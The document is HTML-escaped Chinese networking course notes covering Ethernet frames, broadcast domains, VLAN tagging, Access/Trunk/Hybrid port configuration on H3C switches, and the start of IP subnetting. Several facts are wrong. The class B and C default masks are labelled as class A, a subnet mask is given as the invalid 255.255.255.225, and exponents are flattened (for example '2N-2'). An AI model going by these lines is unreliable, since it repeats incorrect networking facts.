&lt;h3 id=&#34;以太网数字帧的结构&#34;&gt;以太网数字帧的结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;802.3
&lt;ul&gt;
&lt;li&gt;DA | SA | Type | Data | FCS |
&lt;ul&gt;
&lt;li&gt;SA也就是MAC地址和交换机的端口对应起来&lt;/li&gt;
&lt;li&gt;当DA是一个未知的或者是单播的、组播的、广播的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;广播域&#34;&gt;广播域&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;广播数据帧所能够传播的一个网络范围，就是广播域&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由器或三层交换机的三层接口处于独立的广播域中，终端主机发出的广播帧在三层接口被终止&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425003307.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;路由器是不再转发广播数据帧的，因此停留在三层交换机&lt;/p&gt;
&lt;p&gt;三层交换机和路由器中间的电路就是一个网络段，一个网络段就是一个冲突域，也就是一个广播域&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;本节总结-4&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;共享式以太网中所有终端共享总线带宽，交换式以太网中每个终端处于独立的冲突域&lt;/li&gt;
&lt;li&gt;交换机根据接收到的数据帧的源地址进行MAC地址表的学习&lt;/li&gt;
&lt;li&gt;交换机根据MAC地址表对数据帧进行转发&lt;/li&gt;
&lt;li&gt;路由器或三层交换机的三层接口属于独立的广播域&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题-3&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;冲突域、广播域的概念&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;冲突域：所有节点连接在一起，区域内所有的节点，无论发送何种数据（单播、组播、广播）帧，其他节点均能收到，这些节点和设备组成的区域。&lt;/li&gt;
&lt;li&gt;广播域：网络节点设备中广播数据帧能够传播的最大范围，范围内组成的区域。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;共享式以太网和交换式以太网&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;共享式：网络中所有的节点共享总线带宽，节点分享带宽与节点数量成反比，且同一时刻只允许一台终端（节点）发送数据说有节点参与CSMA/CD冲突检测，这种总线型网络叫共享式以太网。&lt;/li&gt;
&lt;li&gt;交互式：网络中使用网桥或交换机连接网络设备，各网络节点独占端口带宽，各个端口使用CSMA/CD冲突检测，端口间数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机MAC地址学习过程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收到数据帧，记录数据帧源MAC地址和端口对应关系，形成MAC地址表&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;802.3以太网数据帧格式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DA | SA | Type | Data | CRC&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425103502.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交换机对单播数据帧、组播数据帧、广播数据帧、未知单播帧的转发形式&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2-配置vlan&#34;&gt;2. 配置VLAN&lt;/h2&gt;
&lt;h3 id=&#34;课程目标-8&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;了解VLAN技术产生的背景&lt;/li&gt;
&lt;li&gt;掌握VLAN的类型及其相关配置&lt;/li&gt;
&lt;li&gt;掌握IEEE 802.1Q 的帧格式&lt;/li&gt;
&lt;li&gt;掌握交换机端口的链路类型及其相关配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录-4&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;VLAN技术简介&lt;/li&gt;
&lt;li&gt;VLAN类型&lt;/li&gt;
&lt;li&gt;VLAN技术原理&lt;/li&gt;
&lt;li&gt;VLAN的基本配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;广播风暴-1&#34;&gt;广播风暴&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;设备发出的广播帧在广播域中传播，占用网络带宽，降低设备性能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425103733.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;用路由器来隔离广播&#34;&gt;用路由器来隔离广播&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;路由器能够隔离广播，减小广播域范围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425114422.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;用vlan隔离广播&#34;&gt;用VLAN隔离广播&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;二层交换机使用VLAN隔离广播，减小广播域范围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425114525.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;vlan的优点&#34;&gt;VLAN的优点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;有效控制广播域范围&lt;/li&gt;
&lt;li&gt;增强局域网的安全性&lt;/li&gt;
&lt;li&gt;灵活构建虚拟工作组&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425114725.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;vlan的类型&#34;&gt;VLAN的类型&lt;/h3&gt;
&lt;h4 id=&#34;基于端口的vlan最有效的&#34;&gt;基于端口的VLAN（最有效的）&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425115114.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;基于mac地址的vlan&#34;&gt;基于MAC地址的VLAN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;需求：在任何时候这台笔记本都在VLAN10里面&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425115142.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;基于协议的vlan&#34;&gt;基于协议的VLAN&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425115223.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;基于子网的vlan&#34;&gt;基于子网的VLAN&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425115257.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;动态VLAN划分方式：基于MAC地址、协议、子网（没有办法有效地阻止广播数据帧的传播）&lt;/p&gt;
&lt;p&gt;静态VLAN划分方式：基于端口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;vlan技术原理&#34;&gt;VLAN技术原理&lt;/h3&gt;
&lt;h4 id=&#34;vlan标签&#34;&gt;VLAN标签&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;交换机用VLAN标签来区分不同VLAN的以太网帧&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425122014.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;标签是怎么来的是，是根据每一个端口的PVIP值来的，在交换机内部，所有的数据帧都是带标签的，这个时候交换机再进行转发的时候，就要根据标签来进行转发&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;8021q帧格式&#34;&gt;802.1Q帧格式&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;标准以太网帧，IEEE 802.3&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;6Byte+6Byte+2Byte+(46-1500)+4Byte=64~1518Byte&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;带有IEEE 802.1Q标记的以太网帧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;6Byte+6Byte++4Byte(16bit+16bit(3+1+12))+2Byte+(46-1500)+4Byte=68Byte-1522Byte&lt;/li&gt;
&lt;li&gt;Tag字段
&lt;ul&gt;
&lt;li&gt;TPID：0x8100代表VLAN的数据帧&lt;/li&gt;
&lt;li&gt;Priority：优先级，值的范围是2^3^，0-7&lt;/li&gt;
&lt;li&gt;CFI：用于标识数据帧的规范形式的，0或者1&lt;/li&gt;
&lt;li&gt;VLAN ID：最大支持2^12^，值的范围也就是0~4095，0和4095保留了，因此支持的就是1~4094&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425122337.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;单交换机vlan标签操作&#34;&gt;单交换机VLAN标签操作&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;在进入交换机端口时，附加缺省VLAN标签&lt;/li&gt;
&lt;li&gt;出交换机端口时，去掉VLAN标签&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425123555.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;缺省的VLAN标签也就是PVID值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;access链路类型端口&#34;&gt;Access链路类型端口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;只允许缺省VLAN通过，仅接收和发送一个VLAN的数据帧&lt;/li&gt;
&lt;li&gt;一般用于连接用户设备&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425124014.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;跨交换机vlan标签操作&#34;&gt;跨交换机VLAN标签操作&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;带有VLAN标签的以太网帧在交换机间传递&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425124303.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;trunk链路类型端口&#34;&gt;Trunk链路类型端口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;允许多个VLAN通过，可以接收和发送多个VLAN的数据帧&lt;/li&gt;
&lt;li&gt;缺省VLAN的以太网帧不带标签（端口的PVID值和标签值相同的时候就不带标签了）&lt;/li&gt;
&lt;li&gt;一般用于交换机之间连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425124508.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;hybrid链路类型端口&#34;&gt;Hybrid链路类型端口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;允许多个VLAN通过，可以接收和发送多个VLAN的数据帧&lt;/li&gt;
&lt;li&gt;Hybrid端口和Trunk端口的不同之处在于：
&lt;ul&gt;
&lt;li&gt;Hybrid端口允许多个VLAN的以太网帧不带标签&lt;/li&gt;
&lt;li&gt;Trunk端口只允许缺省VLAN的以太网帧不带标签&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425124942.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hybrid就无法隔离广播域，这种可以分两个部门，互相不能访问，连接同一个打印机&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;vlan基本配置h3c为例&#34;&gt;VLAN基本配置（H3C为例）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;创建VLAN并进入VLAN视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; vlan vlan-id
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将指定端口加入到当前VLAN中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-vlan10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port interface-list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;配置trunk端口&#34;&gt;配置Trunk端口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;配置端口的链路类型为Trunk类型&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port link-type trunk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;允许指定的VLAN通过当前Trunk端口&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port trunk permit vlan &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; vlan-id-list | all &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置Trunk端口的缺省VLAN&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port trunk pvid vlan vlan-id
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;华三的接口默认都是Access，华为的接口默认都是Hybrid&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;配置hybrid端口&#34;&gt;配置Hybrid端口&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;配置端口的链路类型为Hybrid类型&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port link-type hybrid
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;允许指定的VLAN通过当前Hybrid端口&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port hybrid vlan vlan-id-list &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; tagged | untagged &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置Hybrid端口的缺省VLAN&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Switch-Ethernet1/0/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; port hybrid pvid vlan vlan-id
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;vlan显示及维护&#34;&gt;VLAN显示及维护&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425131702.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;本节总结-5&#34;&gt;本节总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;VLAN的作用是限制局域网中广播传送的范围&lt;/li&gt;
&lt;li&gt;通过对以太网帧进行打标签操作，交换机区分不同VLAN的数据帧&lt;/li&gt;
&lt;li&gt;交换机的端口链路类型分为Access、Trunk和Hybrid&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节习题-4&#34;&gt;本节习题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;**VLAN产生背景：**隔离广播&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;VLAN优点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有效控制广播域范围&lt;/li&gt;
&lt;li&gt;增强局域网的安全性&lt;/li&gt;
&lt;li&gt;灵活构建虚拟工作组&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;VLAN划分方式&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口（最有效）&lt;/li&gt;
&lt;li&gt;MAC&lt;/li&gt;
&lt;li&gt;子网&lt;/li&gt;
&lt;li&gt;协议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IEEE 802.3 帧结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200425134951.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;交换机标签操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Access接口：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;只允许缺省VLAN通过，仅接收和发送一个VLAN的数据帧&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Trunk接口：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;允许多个VLAN通过，可以接收和发送多个VLAN的数据帧&lt;/li&gt;
&lt;li&gt;缺省VLAN的以太网帧不带标签&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hybrid接口：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;允许多个VLAN通过，可以接收和发送多个VLAN的数据帧&lt;/li&gt;
&lt;li&gt;Hybrid端口允许多个VLAN的以太网帧不带标签&lt;/li&gt;
&lt;li&gt;Hybrid端口允许多个VLAN的以太网帧带标签&lt;/li&gt;
&lt;li&gt;Trunk端口只允许缺省VLAN的以太网帧不带标签&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;VLAN配置&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;3-配置vlan---实验&#34;&gt;3. 配置VLAN - 实验&lt;/h2&gt;
&lt;h2 id=&#34;4-生成树协议&#34;&gt;4. 生成树协议&lt;/h2&gt;
&lt;h3 id=&#34;课程目标-9&#34;&gt;课程目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;了解STP产生的背景&lt;/li&gt;
&lt;li&gt;掌握STP基本工作原理&lt;/li&gt;
&lt;li&gt;掌握RSTP和MSTP基本原理&lt;/li&gt;
&lt;li&gt;掌握生成树协议的配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;课程目录-5&#34;&gt;课程目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;生成树背景&lt;/li&gt;
&lt;li&gt;STP&lt;/li&gt;
&lt;li&gt;RSTP&lt;/li&gt;
&lt;li&gt;MSTP&lt;/li&gt;
&lt;li&gt;生成树协议的配置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;生成树背景&#34;&gt;生成树背景&lt;/h3&gt;
&lt;h4 id=&#34;路径回环的影响&#34;&gt;路径回环的影响&lt;/h4&gt;
&lt;h1 id=&#34;第四章高级tcpip知识&#34;&gt;第四章：高级TCP/IP知识&lt;/h1&gt;
&lt;h2 id=&#34;1-子网划分&#34;&gt;1. 子网划分&lt;/h2&gt;
&lt;h3 id=&#34;引入-6&#34;&gt;引入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;根据IP地址的类别（Class）进行IP地址分配的方法表现出越来越多的弊端&lt;/li&gt;
&lt;li&gt;为了解决分类IP地址划分带来的地址浪费，就需要使用子网划分（Subnetting）的方法&lt;/li&gt;
&lt;li&gt;VLSM和CIDR可以进一步提高地址利用效率，缓解地址数量不足的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目标&#34;&gt;本节目标&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;理解IP子网划分的需求背景&lt;/li&gt;
&lt;li&gt;理解IP子网划分的概念&lt;/li&gt;
&lt;li&gt;掌握IP子网划分的相关计算方法&lt;/li&gt;
&lt;li&gt;制定子网划分方案满足网络建设需求&lt;/li&gt;
&lt;li&gt;了解VLSM和CIDR基础知识&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本节目录&#34;&gt;本节目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;子网划分的需求&lt;/li&gt;
&lt;li&gt;IP子网划分基础知识&lt;/li&gt;
&lt;li&gt;IP子网划分相关计算&lt;/li&gt;
&lt;li&gt;VLSM和CIDR&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;子网划分的需求&#34;&gt;子网划分的需求&lt;/h3&gt;
&lt;h4 id=&#34;早期的二级网络结构&#34;&gt;早期的二级网络结构&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427135429.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;大型机构的接入需求&#34;&gt;大型机构的接入需求&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427135701.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;分类ip地址的低效性&#34;&gt;分类IP地址的低效性&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;IP地址资源浪费严重&lt;/li&gt;
&lt;li&gt;IP网络数量不敷使用&lt;/li&gt;
&lt;li&gt;业务扩展缺乏灵活性&lt;/li&gt;
&lt;li&gt;无法应对Internet的爆炸式增长&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip子网划分基础知识&#34;&gt;IP子网划分基础知识&lt;/h3&gt;
&lt;h4 id=&#34;子网划分方法&#34;&gt;子网划分方法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;子网划分前的两级IP地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427140305.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;子网划分后的三级IP地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427140336.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ip地址与子网掩码&#34;&gt;IP地址与子网掩码&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427152152.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;默认掩码&#34;&gt;默认掩码&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;A类地址默认掩码为 &lt;code&gt;255.0.0.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;A类地址默认掩码为 &lt;code&gt;255.255.0.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;A类地址默认掩码为 &lt;code&gt;255.255.255.0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ip子网划分相关计算&#34;&gt;IP子网划分相关计算&lt;/h3&gt;
&lt;h4 id=&#34;示例计算子网地址&#34;&gt;示例：计算子网地址&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;子网掩码与IP地址进行逐位逻辑与运算获得网络地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427152623.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;计算子网内可用主机地址数&#34;&gt;计算子网内可用主机地址数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;假设子网的主机号位数为N，则可用地址数为2N-2个&lt;/li&gt;
&lt;li&gt;主机号全1为广播地址，主机号全0为网络地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427154401.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例计算子网内可用地址数&#34;&gt;示例：计算子网内可用地址数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;子网地址为192.168.3.192，子网掩码为255.255.255.225，计算该子网内的可用主机地址数量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427160430.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;根据主机地址数划分子网&#34;&gt;根据主机地址数划分子网&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;假设每个子网需要划分Y个IP地址，并且满足2N≥Y+2≥2N-1，则主机号位数为N，子网掩码位数为32-N&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200427160508.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;示例根据主机地址数划分子网&#34;&gt;示例：根据主机地址数划分子网&lt;/h4&gt;
&lt;ul&gt;
